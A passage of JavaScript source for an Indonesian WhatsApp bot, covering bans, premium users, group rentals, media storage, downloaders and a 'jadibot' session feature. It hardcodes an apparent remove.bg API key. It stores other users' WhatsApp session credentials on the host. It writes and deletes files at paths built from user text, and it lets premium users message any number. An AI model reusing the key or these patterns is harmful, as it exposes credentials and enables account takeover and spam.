          if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (args.length < 1) return setReply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(q, commandsDB)) return setReply(`Key tersebut tidak ada di database`)
          deleteCommands(q, commandsDB)
          setReply(`Berhasil menghapus respon dengan key ${q}`)
          }
      break
      
      
      
      
  
      
      
           
		case 'ban':
		case 'banned':
		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return setReply('Reply atau tag targetnya')
		    mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
            if (mentioned.length < 1) {
            asu = iky.message.extendedTextMessage.contextInfo.participant
            Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
            if(cekBannedUser (asu, ban)) return setReply("Udah di ban kak")
            if(Nomer === ownerNumber[0]) return setReply("Ga mau")
            addBanned(Nomer, ban)               
            setReply( `*Asik si beban* @${asu.split("@")[0]} *kena banned* 🤣`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)
            ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(cekBannedUser (ahah, ban)) return setReply("Udah di ban kak")     
            addBanned(ahah, ban)  
            setReply(`Asik si wawan @${mentioned[0].split('@')[0]} kena banned 🤣`);
            }
            break
                  
    
    case 'listban': 
       case 'banlist':
              let awe = `*List Banned*\nJumlah : ${ban.length}\n\n`
              for (let i of ban){
              
              awe += `Id : ${i.id.split("@")[0]}\n` 
} 
              awe += `\n© ${fake1}` 
              
              setReply(awe) 
              
              break
			
            
            
            
            
            
			case 'unbanned':
			case 'unban': //PERCOBAA
		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return setReply('Reply targetnya!')
            mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
            if (mentioned.length < 1) {
            asu = iky.message.extendedTextMessage.contextInfo.participant           
            if(!cekBannedUser (asu, ban)) return setReply("Udah di unban")
            unBanned (asu, ban)             
            setReply( `*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${asu.split("@")[0]}`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)    
            lala = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(!cekBannedUser (lala, ban)) return setReply("Udah di unban")        
            unBanned(lala, ban) 
            setReply(`*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${mentioned[0].split('@')[0]}`);
            }
            break    
         



           
           
           case 'resetlimit':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/claim.json', JSON.stringify(obj))
				         fs.writeFileSync('./database/limit.json', JSON.stringify(obj)) 
				         await setReply(`LIMIT BERHASIL DI RESET`)
			             break 
           
     
	case 'setfakeimg':
    if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        	if ((isMedia && !iky.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
			delb = await ikyc.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			setReply(`Berhasil mengubah fake image`)
        	} else {
            setReply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
			
			
		case 'setthumb':
        if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !iky.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : iky;
          delb = await ikyc.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          setReply(`Berhasil mengubah thumbnail`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
			
           
case 'setovo':
        if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !iky.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : iky;
          delb = await ikyc.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/ovo.jpg`, delb);
          setReply(`Berhasil mengubah kode qr ovo`)
        } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setovo`);
        }
        break;
        
        
        case 'setgopay':
        if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !iky.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : iky;
          delb = await ikyc.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/gopay.jpg`, delb);
          setReply(`Berhasil mengubah kode qr gopay`)
       } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setgopay`);
        }
        break;
           
           
       case 'setdana':
        if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !iky.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : iky;
          delb = await ikyc.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/dana.jpg`, delb);
          setReply(`Berhasil mengubah kode qr dana`)
        } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setdana`);
        }
        break;
        
        
        case 'setimagereply':
        case 'setimgreply':
        if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !iky.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : iky;
          delb = await ikyc.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/reply.jpg`, delb);
          setReply(`Berhasil mengubah image reply`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
        }
        break;
        
        
        case 'setimageinfo':
        if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !iky.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : iky;
          delb = await ikyc.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/bot.jpg`, delb);
          setReply(`Berhasil mengubah image pada infobotz`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
        }
        break;
           
           
     case 'addstik':
		if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return setReply('Reply stiker nya')
				
				if (!q) return setReply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await ikyc.downloadMediaMessage(boij)
				setiker.push(`${q}`)
				fs.writeFileSync(`./temp/stick/${q}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				ikyc.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: iky})
				break
					case 'dellstik':
					case 'delstik':
					if(!iky.key.fromMe & !isOwner) return setReply('Only owner')
					if (!q) return setReply(mess.wrongFormat)
					try {
						wanu = imagenye.indexOf(q)
						setiker.splice(wanu,1)
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						setReply(`Succes delete sticker ${q}!`)
					} catch (err) {
						setReply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
				case 'addimg':
				if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return setReply('Reply imagenya')
				
				if (!q) return setReply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await ikyc.downloadMediaMessage(boij)
				imagenye.push(`${q}`)
				fs.writeFileSync(`./temp/foto/${q}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				ikyc.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: iky})
				break
				
				
				case 'delimg':
				if (!isOwner) return onlyOwner() 
					try { 
					 wanu = imagenye.indexOf(q)
					 imagenye.splice(wanu, 1)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					 fs.unlinkSync(`./temp/foto/${q}.jpeg`)
					 setReply( 'Sukses')
					} catch (err){
						console.log(err)
						setReply('error kak')
					}
					break
				
				case 'addvid':
				if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return setReply('Reply vidionya')
				
				if (!q) return setReply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await ikyc.downloadMediaMessage(boij)
				videonye.push(`${q}`)
				fs.writeFileSync(`./temp/video/${q}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(videonye))
				ikyc.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: iky })
				break
				
				
				case 'delvid':
				case 'dellvid':
				if (!isOwner) return onlyOwner() 
					try {
					 
					 wanu = videonye.indexOf(q)
					 videonye.splice(wanu, 1)
					fs.writeFileSync('./temp/video.json', JSON.stringify(videonye))
					 fs.unlinkSync(`./temp/video/${q}.mp4`)
					 setReply('Sukses')
					} catch (err){
						console.log(err)
						setReply('error kak')
					}
					break
				
				
				
				
				case 'addvn':
				if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return setReply('Reply vnnya')
				if (!q) return setReply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await ikyc.downloadMediaMessage(boij)
				audionye.push(q)
				fs.writeFileSync(`./temp/audio/${q}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				ikyc.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: iky})
				break
				
				
				
				case 'adderror':
				case 'emror':
				{
				if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
				if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
				oke = q.split("|")[0]
				oka = q.split("|")[1]
				addError(oke, oka, listerror)
				await setReply(`Sukses Menambahkan ${q} ke daftar error`)
				}
				break
				
				
			      
           
      case 'addbadword':
                if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
                if (args.length < 1) return setReply(`masukkan kata`)
                if (isKasar(q, badword)) return setReply(`Udah ada`)
                addBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'delbadword':
                 if (!isGroupAdmins && !isOwner) return setReply('hanya admin dan owner') 
                if (args.length < 1) return setReply(`masukkan kata`)
                if (!isKasar(q, badword)) return setReply(`Ga ada`)
                delBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return onlyOwner() 
                if (args.length < 1) return setReply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    setReply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    setReply('Sukses')
                }
                break




    

    

case 'antichatbot':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(chatBot === true) return setReply("Udah aktif")
                    chatBot = true
					setReply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(chatBot === false) return setReply("Sudah mati")
                    chatBot = false
					setReply(`Berhasil mematikan Antichatbot`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                





case 'explain':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(explain) return setReply("Udah aktif")
                    explain = true
					setReply(`Sukses mengaktifkan explain silakan cek dengan ketik ${prefix}menu`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(!explain) return setReply("Sudah mati")
                    explain = false
					setReply(`Berhasil mematikan explain`)
                } else if (!q) {
                      sendButMessage(from, `MODE EXPLANATION`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}explain on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}explain off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;





case 'anticall':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(Anticall === true) return setReply("Udah aktif")
                    Anticall = true
					setReply(`Sukses mengaktifkan Anticall`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(Anticall === false) return setReply("Sudah mati")
                    Anticall = false
					setReply(`Berhasil mematikan Anticall`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CALL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}anticall on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}anticall off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
   


              
                 
    
case 'jadibot':
case 'jadilonte':
if (!isOwner) return  setReply("Harus ijin owner")
setReply(mess.wait)
client.version =   [2, 2143, 3];
client.browserDescription = ['IKYY','Ubuntu','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await new Buffer.from(qrbot.replace('data:image/png;base64,', ''), 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await ikyc.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : iky,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
ikyc.deleteMessage(from, scen.key)
}, 30000);
})  
client.on ('open', async () => {
console.log ('credentials update')
const authInfo = client.base64EncodedAuthInfo()
fs.writeFileSync(`./${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)

client.on("group-update", async (anu) => {
require('./message/group-settings.js')(client, anu)
});
client.on('group-participants-update', async (anu) => {
require('./message/group.js')(client, anu)
});
client.on("CB:action,,battery", json => {
const baterai = {
battery: "" || "Belom Terdeteksi",
isCharge: "Sedang di cas" || "Tidak di cas"
}
const battery = json[2][0][1].value
const persenbat2 = parseInt(battery)
baterai.battery = `${persenbat2}%`
baterai.isCharge = json[2][0][1].live
})})
client.on('chat-update', async (chat) => {
require('./ikyc.js')(client, chat, baterai)
})    
await client.connect().then(async ({user}) => {
listjadibot1.push(client.user)
setReply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
setReply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
           
           
           case 'stopjadibot':
if (!isOwner && !iky.key.fromMe) return setReply("tidak bisa stopjadibot kecuali owner")
try {
fs.unlinkSync(`./${sender}.json`)
fs.unlinkSync(`./jadibot@${sender}.jpg`)
client.close()
} catch {
setReply('Done')
client.close()
}
break
	
	
	case 'addsewa':
	           {
		      if (!isOwner) return onlyOwner()
              if (!isGroup)return setReply(mess.only.group)
              if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args.length < 1) return setReply(`Penggunaan :\n*${prefix}addsewa waktu`)       
             if(_sewa.checkSewaGroup(from, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
             linkgc = await ikyc.groupInviteCode(from)
             yeh = `https://chat.whatsapp.com/${linkgc}`          
            _sewa.addSewaGroup(from, groupName, yeh, q, sewa)
             await setReply(`Success`)
              }
              break
              
              case 'delsewa':
              {
              if (!isOwner) return onlyOwner()
              if (!isGroup)return setReply(mess.only.group)
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
              setReply(mess.success)
              }
              break
              
              
              
              
              
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
               } 
               txtnyee += `© ${fake1}`
              setReply(txtnyee)
              break
              
              
       case 'orderlist': 
       case 'listorder':
              if (!isOwner) return onlyOwner()
              let ordernye = `*List Order*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
               } 
               ordernye += `© ${fake1}`
              setReply(ordernye)
              break
              
            case 'listuser':
			case 'userlist':
			       if (!isOwner) return onlyOwner()
				     let usernye = `*List User*\nJumlah : ${user.length}\n\n`
			user.map(function(e, i){
            usernye += (i+1)+`. ${e.split("@")[0]}\n`            
        });
				
				setReply(usernye)
				break
              
              
              
              
      case 'listerror': 
      case 'errorlist':
      case 'daftarerror':
              let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
              for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
              errornye += `Command : ${i.cmd}\n${i.error}\n\n`             
               } 
               errornye += `© ${fake1}`
              setReply(errornye)
              break

	
	
	case 'premium':
	case 'prem':
	case 'addprem':
	       if (!isOwner) return onlyOwner()
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}addprem Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}addprem +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
if(args.length > 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
if(args.length < 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
nomor = args[0] + `@s.whatsapp.net`              
if(_prem.checkPremiumUser (nomor, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (nomor, args[1], premium)         
await setReply(`Succes add premium ${nomor}`)
await sendButMessage(nomor, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
} else if (iky.message.extendedTextMessage.contextInfo.participant) {
premnih = iky.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
if(args.length < 1) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
 if(_prem.checkPremiumUser (premnih, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (premnih, q, premium)         
 await setReply(`Succes add premium ${premnih.split("@")[0]}`)
await sendButMessage(premnih, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
 } else if(iky.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if(args.length < 2) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
 if(_prem.checkPremiumUser (lulu, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (lulu, args[1], premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await sendButMessage(lulu, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else{
 setReply(`Kirim perintah ${prefix}addprem @tag atau nomor atau reply pesan orang yang ingin di addprem`)
 }
break    
	
	

case 'nobg':
if ((isMedia || isQuotedImage)) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
                        const media = await ikyc.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        setReply(mess.wait)
                        keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return setReply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return setReply(`emror bang ${err}`)
                                ikyc.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: iky })
                                    fs.unlinkSync(ranw)
                                })
                            }) 
                            }
break
	
  
         
case 'delprem':
case 'delpremium':
       if (!isOwner) return onlyOwner()
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply("Penggunaan : delprem Tag/Input nomer target yang mau di batalin")
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
if(args[3]) return setReply(`Format salah, ketik ${prefix}delprem 62851xxx  Gitu tod`)
nomor = args[0] + `@s.whatsapp.net` 
if(!_prem.checkPremiumUser (nomor, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
          _prem.delPremiumUser (nomor, premium)
          return setReply(`Succes delete premium ${nomor}`)
          
 } else if (iky.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
premnih = iky.message.extendedTextMessage.contextInfo.participant
if(args.length > 0) return setReply("Format salah")
if(!_prem.checkPremiumUser (premnih, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
 _prem.delPremiumUser (premnih, premium) 
  await setReply(`Succes delete premium  ${premnih.split("@")[0]}`)
  
} else if(iky.message.extendedTextMessage.contextInfo.mentionedJid) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if(mentioned.length > 1) return setReply("Satu satu kak")
	lulu = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
	if(!_prem.checkPremiumUser (lulu, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
_prem.delPremiumUser (lulu, premium) 
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
 }
break    
	
          
          
                 


 
                  
                  
         
	
	
	
	
	
	case 'addstatus':
	case 'addstory':
					if (!isOwner && !iky.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
							await ikyc.sendMessage('status@broadcast', buff, image, {caption: `${q}`})
						await setReply(`Sukses mengirim up status image ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
							await ikyc.sendMessage('status@broadcast', buff, video, {caption: `${q}`})
						setReply(`Sukses mengirim up status video ${q}`)
						} else {
							await ikyc.sendMessage('status@broadcast', `*${q}`,text)
						await sendMess(`Sukses mengirim status:\n${q}`)
					}
					break
					
	
	
//-------------------------------》FITUR PREMIUM《-------------------------------\\       
	
	
case 'cariteman':
case 'caridoi':
if (!isPremium && !isOwner && !iky.key.fromMe) return setReply(`Kamu bukan user premium`)
	const namanya = ikyc.contacts[teman] != undefined ? ikyc.contacts[teman].vname || ikyc.contacts[teman].notify : undefined
	setTimeout( () => {
                    setReply("Sedang mencari....")
                    },1000)  
	setTimeout( () => {
                    setReply("Berhasil mendapatkan satu doi")
                    },5000)  
    setTimeout( () => {           
    sendKontak(from, `${teman.split("@")[0]}`, namanya, "Sibuk");
                    },9000)  
    break
	
	
	
	
	
	
	case 'chat':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
           if (args.length < 1) return setReply(`Penggunaan ${prefix}chat 62xnxx|teks`)
			if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
            var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
            var org = q.split("|")[1];
            ikyc.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)
            break
	
	
//-----------------------------------] Menu Download [-----------------------------------//
	
/*
    otakudesu,
	covid,
	ongoing,
	komiku,✓
	tebakgambar,
	surah,
	sholat,
	lirik,
	chara,✓
	wattpad,
	playstore,✓
	linkwa,✓
	pinterest,✓
	igdl,✓
	igstory,✓
	igstalk,✓
	twitter,✓
	fbdown,✓
	youtube,
	ttdownloader✓
         -ttaudio
         -ttwm✓
         -ttnowm✓
*/


case 'komiku':

            if(!q) return setReply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
fotonya = komik.image  
            sendFileFromUrl(fotonya, image, {quoted: iky, caption: result})
            break


case 'twmp4': case 'twitter':
if (args.length < 1) return setReply('Link?')
lin = args[0]
setReply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
sendMediaURL(from, Anu, 'Done!')
})
break


case 'twmp4hd':
case 'twitterhd':
  if (!isPremium && !isOwner && !iky.key.fromMe) return setReply(`Kamu bukan user premium`)
if (args.length < 1) return setReply('Link?')
lin = args[0]
setReply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.HD
fotonya = res.thumb
//fto =  await getBuffer(fotonya)
//ikyc.sendMessage(from, fto, image, {quoted:iky, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fto, contextInfo:forward})
sendMediaURL(from, Anu, 'Done!')
})
break

case 'lirik':
try{
            if(!q) return setReply('lagu apa?')
            let song = await hx.lirik(q)
            musik = song.lirik
            if(`${musik}` === "undefined" ) return setReply("Gak ketemu om")
            foto = await getBuffer(song.thumb)
            liriknya = song.lirik
            let oket = [{
